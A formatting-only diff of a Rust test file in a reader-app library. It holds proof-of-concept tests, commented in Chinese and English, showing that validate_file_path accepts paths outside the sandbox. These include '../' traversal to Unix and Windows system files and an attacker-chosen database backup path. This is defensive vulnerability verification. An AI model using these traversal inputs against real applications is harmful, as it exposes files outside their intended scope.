@@ -13,8 +13,8 @@
 //! PoC-Status: executed
 
 use rust_lib_zephyr_reader::common::security::validate_file_path;
-use std::path::Path;
 use std::fs;
+use std::path::Path;
 use tempfile::TempDir;
 
 mod common;
@@ -45,8 +45,10 @@ fn test_poc_escape_basic() {
     // validate_file_path 应该拒绝此路径 (因为它在沙箱外)
     // 但实际上它只检查文件存在且是文件，然后返回规范路径
     let result = validate_file_path(&outside_str);
-    assert!(result.is_ok(),
-        "BUG: validate_file_path 应当拒绝沙箱外路径 (基目录限制缺失)，但返回了 Err");
+    assert!(
+        result.is_ok(),
+        "BUG: validate_file_path 应当拒绝沙箱外路径 (基目录限制缺失)，但返回了 Err"
+    );
 
     let canonical = result.unwrap();
 
@@ -62,11 +64,15 @@ fn test_poc_escape_basic() {
     println!("  LEGITIMATE file:     {:?}", _sandbox_file);
     println!("  Attacker target:     {:?}", outside_file);
     println!("  Input path:          {}", outside_str);
-    println!("  Canonicalized path:  {} (ACCEPTED — no base check!)", canonical);
-    let is_outside = !canonical.contains(
-        &sandbox.path().to_string_lossy().to_string()
+    println!(
+        "  Canonicalized path:  {} (ACCEPTED — no base check!)",
+        canonical
     );
-    println!("  Is outside sandbox?  {}", if is_outside { "YES" } else { "NO (contained)" });
+    let is_outside = !canonical.contains(&sandbox.path().to_string_lossy().to_string());
+    println!(
+        "  Is outside sandbox?  {}",
+        if is_outside { "YES" } else { "NO (contained)" }
+    );
     println!("  ===== SECURITY IMPACT =====");
     println!("  Any caller that trusts validate_file_path for scope enforcement");
     println!("  will process attacker-chosen files outside the intended directory.");
@@ -91,11 +97,18 @@ fn test_poc_path_traversal() {
                 found = true;
                 // 使用相对路径遍历
                 let depth = target.matches('/').count();
-                let traversal = format!("{}{}", "../".repeat(depth + 1), target.trim_start_matches('/'));
+                let traversal = format!(
+                    "{}{}",
+                    "../".repeat(depth + 1),
+                    target.trim_start_matches('/')
+                );
 
                 let result = validate_file_path(&traversal);
-                assert!(result.is_ok(),
-                    "BUG: 相对路径 '{}' 应被拒绝，但 validate_file_path 返回了 Err", traversal);
+                assert!(
+                    result.is_ok(),
+                    "BUG: 相对路径 '{}' 应被拒绝，但 validate_file_path 返回了 Err",
+                    traversal
+                );
 
                 let canonical = result.unwrap();
                 println!("[PoC-EVIDENCE] PATH TRAVERSAL VIA RELATIVE PATH CONFIRMED");
@@ -108,7 +121,9 @@ fn test_poc_path_traversal() {
         }
 
         if !found {
-            println!("[PoC-INFO] No standard readable system files found, skipping Unix traversal test");
+            println!(
+                "[PoC-INFO] No standard readable system files found, skipping Unix traversal test"
+            );
             println!("[PoC-INFO] (Expected in container/CI environments)");
         }
     }
@@ -127,8 +142,10 @@ fn test_poc_path_traversal() {
             if Path::new(test_path).exists() {
                 found = true;
                 let result = validate_file_path(test_path);
-                assert!(result.is_ok(),
-                    "BUG: Windows 系统文件路径应被拒绝，但 validate_file_path 返回了 Err");
+                assert!(
+                    result.is_ok(),
+                    "BUG: Windows 系统文件路径应被拒绝，但 validate_file_path 返回了 Err"
+                );
                 let canonical = result.unwrap();
                 println!("[PoC-EVIDENCE] WINDOWS SYSTEM FILE READ CONFIRMED");
                 println!("  Input:  {}", test_path);
@@ -152,7 +169,10 @@ fn test_poc_path_traversal() {
     let current_dir = std::env::current_dir().expect("current dir");
     std::env::set_current_dir(outer.path()).expect("cd to outer");
 
-    let traversal = format!("./{}/target.txt", inner.path().file_name().unwrap().to_str().unwrap());
+    let traversal = format!(
+        "./{}/target.txt",
+        inner.path().file_name().unwrap().to_str().unwrap()
+    );
     if file.exists() {
         let result = validate_file_path(&traversal);
         if let Ok(canonical) = result {
@@ -181,14 +201,20 @@ fn test_poc_cover_extraction_chain_exploitable() {
 
     // 在沙箱外创建任意文件
     let outside_file = outside_dir.path().join("somefile.txt");
-    fs::write(&outside_file, "not a real epub but validate_file_path doesn't care")
-        .expect("write outside file");
+    fs::write(
+        &outside_file,
+        "not a real epub but validate_file_path doesn't care",
+    )
+    .expect("write outside file");
 
     // 验证 validate_file_path 接受此文件路径
     let file_str = outside_file.to_str().unwrap().to_string();
     let result = validate_file_path(&file_str);
-    assert!(result.is_ok(),
-        "BUG: validate_file_path rejected outside path {:?}", file_str);
+    assert!(
+        result.is_ok(),
+        "BUG: validate_file_path rejected outside path {:?}",
+        file_str
+    );
 
     let validated = result.unwrap();
     println!("[PoC-EVIDENCE] COVER EXTRACTION CHAIN EXPLOITABLE");
@@ -219,14 +245,20 @@ fn test_poc_restore_database_scope_escape() {
 
     // validate_file_path 阶段: 接受 — 因为它只检查文件存在且是文件
     let result = validate_file_path(&backup_str);
-    assert!(result.is_ok(),
-        "BUG: validate_file_path rejected malicious backup path {:?}", backup_str);
+    assert!(
+        result.is_ok(),
+        "BUG: validate_file_path rejected malicious backup path {:?}",
+        backup_str
+    );
 
     let validated = result.unwrap();
     println!("[PoC-EVIDENCE] restore_database SCOPE ESCAPE CONFIRMED");
     println!("  Malicious backup:     {:?}", malicious_backup);
     println!("  Sandbox dir:          {:?}", sandbox.path());
-    println!("  Validated path:       {} (accepted, no base check)", validated);
+    println!(
+        "  Validated path:       {} (accepted, no base check)",
+        validated
+    );
     println!("  Is outside sandbox?   YES");
     println!("  Attack chain:");
     println!("    1. Attacker controls backup_path argument to restore_database()");
@@ -257,12 +289,18 @@ fn test_poc_whitelist_violation() {
     // 用户选择了一个在 app_data 外的文件（可能是社会工程学或文件选择器操纵）
     let illegal_str = illegal.to_str().unwrap().to_string();
     let result = validate_file_path(&illegal_str);
-    assert!(result.is_ok(), "BUG: validate_file_path should reject outside paths but accepted");
+    assert!(
+        result.is_ok(),
+        "BUG: validate_file_path should reject outside paths but accepted"
+    );
 
     println!("[PoC-EVIDENCE] WHITELIST VIOLATION CONFIRMED");
     println!("  App data dir:         {:?}", app_data.path());
     println!("  Allowed file:         {:?}", _legit);
-    println!("  Attacker file:        {:?} (OUTSIDE allowed dir)", illegal);
+    println!(
+        "  Attacker file:        {:?} (OUTSIDE allowed dir)",
+        illegal
+    );
     println!("  Validated:            {} (accepted!)", result.unwrap());
     println!("  Impact: Calling code that expects file to be in app_data dir");
     println!("          will operate on an attacker-chosen file.");
@@ -276,13 +314,13 @@ fn test_poc_whitelist_violation() {
 fn create_minimal_sqlite(path: &Path) {
     // SQLite 数据库文件头 (100 字节)
     let header: [u8; 100] = [
-        0x53, 0x51, 0x4c, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x20, 0x33, 0x00,
-        0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00,
+        0x53, 0x51, 0x4c, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x20, 0x33,
+        0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     ];
     fs::write(path, header).expect("write minimal sqlite db");
 }
